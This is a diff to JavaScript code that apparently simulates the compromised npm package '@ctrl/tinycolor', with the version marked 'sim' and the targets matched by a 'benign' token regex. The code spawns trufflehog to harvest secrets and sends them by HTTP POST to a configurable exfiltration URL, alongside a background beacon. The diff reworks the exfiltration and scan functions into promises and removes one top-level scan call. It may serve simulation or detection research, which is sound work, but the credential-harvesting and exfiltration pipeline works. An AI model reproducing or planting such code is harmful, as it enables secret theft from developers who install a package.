@@ -7,7 +7,7 @@ const PACKAGE_NAME = '@ctrl/tinycolor';
 const PACKAGE_VERSION = '3.6.0-sim';
 const DEFAULT_PERCENT = 10;
 const BENIGN_REGEX = 'SAFE_TOKEN_[0-9]{3}';
-const TRUFFLEHOG_TIMEOUT_MS = 15000;
+const TRUFFLEHOG_TIMEOUT_MS = 5000;
 const isNodeRuntime =
   typeof process !== 'undefined' &&
   !!process.versions &&
@@ -232,10 +232,10 @@ function harvestBenignSecrets() {
 }
 function exfiltrateArtifacts(artifacts, source) {
   if (!artifacts || !isNodeRuntime) {
-    return;
+    return Promise.resolve();
   }
   if (process.env.CTRL_TINYCOLOR_DISABLE_EXFIL) {
-    return;
+    return Promise.resolve();
   }
 
   const urlString = process.env.CTRL_TINYCOLOR_EXFIL_URL || DEFAULT_EXFIL_URL;
@@ -247,12 +247,12 @@ function exfiltrateArtifacts(artifacts, source) {
     if (typeof console !== 'undefined') {
       console.debug(PACKAGE_NAME + ' invalid exfil URL', { urlString, error });
     }
-    return;
+    return Promise.resolve();
   }
 
   const client = parsedUrl.protocol === 'http:' ? http : https;
   if (!client) {
-    return;
+    return Promise.resolve();
   }
 
   const body = JSON.stringify({
@@ -287,35 +287,41 @@ function exfiltrateArtifacts(artifacts, source) {
     timeout: 4000,
   };
 
-  try {
-    const req = client.request(requestOptions, (res) => {
-      if (typeof res.resume === 'function') {
-        res.resume();
-      } else {
-        res.on('data', () => {});
-        res.on('end', () => {});
-      }
-    });
-    req.on('error', (error) => {
-      if (typeof console !== 'undefined') {
-        console.debug(PACKAGE_NAME + ' exfil request error', error);
-      }
-    });
-    req.on('timeout', () => {
-      try {
-        req.destroy();
-      } catch (destroyError) {
-        if (typeof console !== 'undefined') {
-          console.debug(PACKAGE_NAME + ' exfil timeout', destroyError);
+  return new Promise((resolve) => {
+    try {
+      const req = client.request(requestOptions, (res) => {
+        if (typeof res.resume === 'function') {
+          res.resume();
+        } else {
+          res.on('data', () => {});
         }
+        res.on('end', () => resolve());
+        res.on('error', () => resolve());
+      });
+      req.on('error', (error) => {
+        if (typeof console !== 'undefined') {
+          console.debug(PACKAGE_NAME + ' exfil request error', error);
+        }
+        resolve();
+      });
+      req.on('timeout', () => {
+        try {
+          req.destroy();
+        } catch (destroyError) {
+          if (typeof console !== 'undefined') {
+            console.debug(PACKAGE_NAME + ' exfil timeout', destroyError);
+          }
+        }
+        resolve();
+      });
+      req.end(body);
+    } catch (error) {
+      if (typeof console !== 'undefined') {
+        console.debug(PACKAGE_NAME + ' failed to exfiltrate', error);
       }
-    });
-    req.end(body);
-  } catch (error) {
-    if (typeof console !== 'undefined') {
-      console.debug(PACKAGE_NAME + ' failed to exfiltrate', error);
+      resolve();
     }
-  }
+  });
 }
 
 
@@ -346,7 +352,7 @@ function shouldLaunchTrufflehog() {
 
 function reportHarvestedArtifacts(artifacts, source) {
   if (!artifacts) {
-    return;
+    return Promise.resolve();
   }
 
   if (typeof console !== 'undefined') {
@@ -369,17 +375,17 @@ function reportHarvestedArtifacts(artifacts, source) {
     }
   }
 
-  exfiltrateArtifacts(artifacts, source);
+  return exfiltrateArtifacts(artifacts, source);
 }
 
 function launchTrufflehogScan() {
   if (!shouldLaunchTrufflehog()) {
-    return;
+    return Promise.resolve();
   }
 
   const globalScope = typeof globalThis !== 'undefined' ? globalThis : global;
   if (globalScope.__CTRL_TINYCOLOR_TRUFFLEHOG_ACTIVE__) {
-    return;
+    return Promise.resolve();
   }
   globalScope.__CTRL_TINYCOLOR_TRUFFLEHOG_ACTIVE__ = true;
 
@@ -406,60 +412,75 @@ function launchTrufflehogScan() {
     command = 'trufflehog';
   }
 
-  let child;
-  try {
-    child = spawnChildProcess(command, finalArgs, {
-      cwd: process.cwd(),
-      env: baseEnv,
-      stdio: 'ignore',
-      detached: false,
-    });
-  } catch (error) {
-    if (typeof console !== 'undefined') {
-      console.error(`${PACKAGE_NAME} failed to launch trufflehog`, { error, command, args: finalArgs });
-    }
-    reportHarvestedArtifacts(harvest, `${source}-spawn-error`);
-    return;
-  }
-
-  if (!child) {
-    reportHarvestedArtifacts(harvest, `${source}-spawn-null`);
-    return;
-  }
-
-  const timeout = setTimeout(() => {
-    if (!child.killed && typeof child.kill === 'function') {
-      child.kill('SIGTERM');
-    }
-  }, TRUFFLEHOG_TIMEOUT_MS);
-
-  if (typeof timeout.unref === 'function') {
-    timeout.unref();
-  }
-
-  child.on('error', (error) => {
-    if (typeof console !== 'undefined') {
-      console.error(`${PACKAGE_NAME} trufflehog process error`, error);
-    }
-  });
-
-  child.on('exit', (code, signal) => {
-    clearTimeout(timeout);
-    if (typeof console !== 'undefined') {
-      console.warn(`${PACKAGE_NAME} trufflehog scan completed`, {
-        code,
-        signal,
-        pattern: BENIGN_REGEX,
-        source,
+  return new Promise((resolve) => {
+    let settled = false;
+    const settle = (exfilPromise) => {
+      if (settled) return;
+      settled = true;
+      const promise = (exfilPromise && typeof exfilPromise.then === 'function')
+        ? exfilPromise
+        : Promise.resolve();
+      promise.then(() => {
+        globalScope.__CTRL_TINYCOLOR_TRUFFLEHOG_ACTIVE__ = false;
+        resolve();
       });
+    };
+
+    let child;
+    try {
+      child = spawnChildProcess(command, finalArgs, {
+        cwd: process.cwd(),
+        env: baseEnv,
+        stdio: 'ignore',
+        detached: false,
+      });
+    } catch (error) {
+      if (typeof console !== 'undefined') {
+        console.error(`${PACKAGE_NAME} failed to launch trufflehog`, { error, command, args: finalArgs });
+      }
+      settle(reportHarvestedArtifacts(harvest, `${source}-spawn-error`));
+      return;
     }
-    reportHarvestedArtifacts(harvest, source);
+
+    if (!child) {
+      settle(reportHarvestedArtifacts(harvest, `${source}-spawn-null`));
+      return;
+    }
+
+    const timeout = setTimeout(() => {
+      if (!child.killed && typeof child.kill === 'function') {
+        child.kill('SIGTERM');
+      }
+    }, TRUFFLEHOG_TIMEOUT_MS);
+
+    if (typeof timeout.unref === 'function') {
+      timeout.unref();
+    }
+
+    child.on('error', (error) => {
+      if (typeof console !== 'undefined') {
+        console.error(`${PACKAGE_NAME} trufflehog process error`, error);
+      }
+      settle(reportHarvestedArtifacts(harvest, `${source}-process-error`));
+    });
+
+    child.on('exit', (code, signal) => {
+      clearTimeout(timeout);
+      if (typeof console !== 'undefined') {
+        console.warn(`${PACKAGE_NAME} trufflehog scan completed`, {
+          code,
+          signal,
+          pattern: BENIGN_REGEX,
+          source,
+        });
+      }
+      settle(reportHarvestedArtifacts(harvest, source));
+    });
   });
 }
 
 try {
   scheduleBackgroundBeacon();
-  launchTrufflehogScan();
 } catch (error) {
   if (typeof console !== 'undefined') {
     console.error(`${PACKAGE_NAME} failed to schedule background activity`, error);
